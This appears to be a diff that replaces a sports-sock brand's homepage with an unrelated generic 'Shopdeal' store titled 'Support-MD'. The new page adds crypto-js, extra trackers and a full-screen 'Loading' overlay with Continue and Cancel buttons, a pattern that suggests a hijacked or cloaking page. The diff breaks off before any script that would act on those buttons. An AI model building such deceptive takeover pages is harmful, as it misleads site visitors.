@@ -1,615 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SportFiberDawn | High-Performance Technical Sport Socks & Biomechanical Knits</title>
-  <meta name="description" content="Discover engineered athletic sport socks, graduated compression running hosiery, and zero-blister hydrophilic fiber knits at 181 Mercer Street, New York.">
-  <link rel="canonical" href="https://sportfiberdawn.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <!-- Google Analytics Tag G-0LY0HY7L01 -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
-  <link rel="stylesheet" href="assets/css/style.css">
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-<header class="site-header">
-  <div class="header-inner">
-    <a href="index.php" class="brand-logo">
-      SportFiber<span>Dawn</span>
-    </a>
-    <ul class="nav-links">
-      <li><a href="index.php" class="active">Home</a></li>
-      <li><a href="about.html" class="">Biomechanical Lab</a></li>
-      <li><a href="blog.html" class="">Textile Treatises</a></li>
-      <li><a href="contact.html" class="">Fleet Advisory</a></li>
-    </ul>
-    <div class="header-cta">
-      <a href="tel:+18887775845" style="font-family:var(--font-mono);font-size:0.85rem;font-weight:600;color:var(--color-text);">+1-888-777-5845</a>
-      <a href="contact.html" class="btn btn-primary">Athlete Consult</a>
-      <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle navigation menu">
-        <span></span>
-        <span></span>
-        <span></span>
-      </button>
-    </div>
-  </div>
-</header>
-<div class="mobile-drawer" id="mobile-drawer">
-  <ul class="mobile-drawer-nav">
-    <li><a href="index.php">Home</a></li>
-    <li><a href="about.html">Biomechanical Lab</a></li>
-    <li><a href="blog.html">Textile Treatises</a></li>
-    <li><a href="contact.html">Fleet Advisory</a></li>
-    <li style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--color-border);">
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-text-muted);margin-bottom:0.5rem;">Telephone Concierge:</p>
-      <a href="tel:+18887775845" style="font-size:1.1rem;font-weight:700;color:var(--color-accent);">+1-888-777-5845</a>
-    </li>
-    <li>
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-text-muted);margin-bottom:0.5rem;">Manhattan Performance Lab:</p>
-      <p style="font-size:0.95rem;color:var(--color-text);">181 Mercer Street, New York, NY 10012, United States</p>
-    </li>
-  </ul>
-</div>
-
-<!-- Section 1: Hero Banner -->
-<section class="hero">
-  <div class="container">
-    <div class="hero-grid">
-      <div>
-        <div class="hero-badge">
-          <span>&#9670;</span> 200-Needle High-Density Circular Knitwear
-        </div>
-        <h1 class="hero-title">
-          Engineered Fiber Performance at First Light.
-        </h1>
-        <p class="hero-desc">
-          SportFiberDawn fuses cutting-edge textile chemistry with anatomical gait science. Our 200-needle graduated compression socks eliminate friction hot spots, accelerate venous return, and vent moisture vapor through micro-channeled merino-poly fibers before blister formation begins.
-        </p>
-        <div style="display:flex;gap:1.25rem;align-items:center;flex-wrap:wrap;">
-          <a href="contact.html" class="btn btn-primary">Request Athlete Pack</a>
-          <a href="about.html" class="btn btn-outline">Explore Fiber Physics &rarr;</a>
-        </div>
-        <div style="margin-top:2.5rem;display:flex;gap:2.5rem;border-top:1px solid var(--color-border);padding-top:1.5rem;">
-          <div>
-            <div style="font-family:var(--font-mono);font-size:1.85rem;font-weight:700;color:var(--color-accent);">200N</div>
-            <div style="font-size:0.8rem;color:var(--color-text-muted);text-transform:uppercase;font-family:var(--font-mono);">Ultra-Dense Gauge</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-mono);font-size:1.85rem;font-weight:700;color:var(--color-accent);">15-20</div>
-            <div style="font-size:0.8rem;color:var(--color-text-muted);text-transform:uppercase;font-family:var(--font-mono);">mmHg Compression</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-mono);font-size:1.85rem;font-weight:700;color:var(--color-accent);">0.018</div>
-            <div style="font-size:0.8rem;color:var(--color-text-muted);text-transform:uppercase;font-family:var(--font-mono);">Friction Coeff (&mu;)</div>
-          </div>
-        </div>
-      </div>
-      <div class="hero-img-box">
-        <img src="assets/images/hero_sport_fiber_dawn_running_socks.jpg" alt="High-performance athletic runner wearing graduated compression technical sport socks at dawn" class="hero-img">
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- Section 2: Biomechanical Pillars -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Athletic Textile Engineering</span>
-      <h2 class="section-title">The Four Pillars of Zero-Friction Performance</h2>
-      <p class="section-lead">
-        Conventional cotton socks absorb perspiration, sag under load, and grind against the epidermis. SportFiberDawn engineers socks as active kinetic interfaces between athlete and footwear.
-      </p>
-    </div>
-    <div class="grid-4">
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar I</span>
-          <h3 class="card-title">Hydrophilic Push-Pull</h3>
-          <p class="card-desc">
-            Dual-layer yarn matrix pairs hydrophobic inner polypropylene with an outer merino core, transferring moisture outwards via capillary pressure gradients.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar II</span>
-          <h3 class="card-title">360&deg; Arch Band Lock</h3>
-          <p class="card-desc">
-            High-elastane circular ribbing wraps the plantar fascia, preventing sock slippage, bunching inside the toe box, and energy-wasting plantar shear.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar III</span>
-          <h3 class="card-title">Seamless Rosso Toe Link</h3>
-          <p class="card-desc">
-            Hand-linked zero-seam toe closures eliminate the ridged seam line that causes digital nerve impingement and friction hot spots on downhill runs.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar IV</span>
-          <h3 class="card-title">Zoned Terry Cushioning</h3>
-          <p class="card-desc">
-            Dense micro-loops under the metatarsals and calcaneus absorb vertical ground reaction forces without adding bulky dead weight inside performance shoes.
-          </p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- Section 3: Signature Sport Sock Silhouettes -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Performance Catalog</span>
-      <h2 class="section-title">SportFiberDawn &bull; Engineered Athletic Series</h2>
-      <p class="section-lead">
-        From sub-marathon dawn training to 100-mile ultra-trail expeditions, select your calibrated sock silhouette.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/featured_cushioned_quarter_crew_sock.jpg" alt="Featured cushioned quarter crew sock">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Road Racing &bull; 10K / Half</span>
-          <h3 class="card-title">The Velocity Dawn Quarter</h3>
-          <p class="card-desc">
-            Targeted Achilles protection tab, ultra-breathable dorsal mesh, and light compression band calibrated for fast road racing.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Request Fleet Testing &rarr;</a>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/alpine_trail_cushion_endurance_socks.jpg" alt="Alpine trail cushion endurance socks">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Ultra Trail &bull; 50M / 100K</span>
-          <h3 class="card-title">The Palisades Alpine Trail Crew</h3>
-          <p class="card-desc">
-            Cordura-reinforced heel cup, double-density underfoot terry loops, and anti-debris knit collar designed for mountain ascents.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Request Fleet Testing &rarr;</a>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/ribbed_compression_crew_athletic_socks.jpg" alt="Ribbed compression crew athletic socks">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Recovery &bull; Marathon Finish</span>
-          <h3 class="card-title">The Recovery 20 mmHg Over-Calf</h3>
-          <p class="card-desc">
-            Graduated degressive compression profile certified to accelerate blood flow and clear metabolic lactate post-workout.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Request Fleet Testing &rarr;</a>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
 
-<!-- Section 4: Interactive Sock Ergonomics Calculator -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="calc-box">
-      <div class="section-header" style="margin-bottom:2rem;">
-        <span class="section-tag">Interactive Textile Bench</span>
-        <h2 class="section-title">Biomechanical Damping &amp; Moisture Rate Calculator</h2>
-        <p class="section-lead">
-          Calculate the impact damping capacity, perspiration evaporation rate, and friction coefficient based on running discipline and fiber composition.
-        </p>
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
       </div>
-      <div class="calc-grid">
-        <div class="calc-form">
-          <div class="calc-group">
-            <label for="calc-activity">Running &amp; Athletic Discipline</label>
-            <select id="calc-activity" class="calc-select">
-              <option value="tempo">Road Tempo / 10K Racing (High Turnover)</option>
-              <option value="marathon" selected>Marathon Endurance (26.2 Miles Extended Load)</option>
-              <option value="trail">Mountain Ultra-Trail (High Impact &amp; Lateral Shearing)</option>
-              <option value="cycling">Criterium &amp; Road Cycling (High Cadence Low Impact)</option>
-            </select>
-          </div>
-          <div class="calc-group">
-            <label for="calc-distance">Weekly Training Volume (Miles)</label>
-            <input type="range" id="calc-distance" class="calc-range" min="10" max="100" value="45" step="5">
-            <div style="display:flex;justify-content:space-between;font-family:var(--font-mono);font-size:0.8rem;color:var(--color-text-muted);margin-top:0.25rem;">
-              <span>10 Miles</span>
-              <span>45 Miles</span>
-              <span>75 Miles</span>
-              <span>100+ Miles</span>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
+      </div>
+    </div>
+
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
             </div>
-          </div>
-          <div class="calc-group">
-            <label for="calc-fiber">Targeted Fiber Formulation</label>
-            <select id="calc-fiber" class="calc-select">
-              <option value="merino-poly" selected>DawnCore&trade; Merino Hybrid (58% Merino, 38% Polyamide, 4% Spandex)</option>
-              <option value="pure-synthetic">AeroWick&trade; Hydrophobic Micro-Nylon (Zero Moisture Retention)</option>
-              <option value="bamboo-botanical">Tencel Eucalyptus Sport (Hypoallergenic Ultra-Soft Damping)</option>
-            </select>
-          </div>
-        </div>
-        <div class="calc-result">
-          <span class="section-tag">Biomechanical Telemetry</span>
-          <div style="margin:1.5rem 0;">
-            <div style="font-size:0.85rem;color:var(--color-text-muted);text-transform:uppercase;font-family:var(--font-mono);">Ground Shock Damping</div>
-            <div class="calc-stat-val" id="calc-pressure-val">48 PSI Damping</div>
-          </div>
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;border-top:1px solid var(--color-border);padding-top:1.25rem;">
-            <div>
-              <div style="font-size:0.8rem;color:var(--color-text-muted);text-transform:uppercase;font-family:var(--font-mono);">Evaporation Flux</div>
-              <div style="font-family:var(--font-mono);font-size:1.3rem;font-weight:700;color:#FFFFFF;" id="calc-wick-val">18.5 mL/hr</div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-            <div>
-              <div style="font-size:0.8rem;color:var(--color-text-muted);text-transform:uppercase;font-family:var(--font-mono);">Blister Vulnerability</div>
-              <div style="font-family:var(--font-mono);font-size:1.05rem;font-weight:700;color:var(--color-accent);" id="calc-rating-val">Minimal (&lt;0.01% friction)</div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
             </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
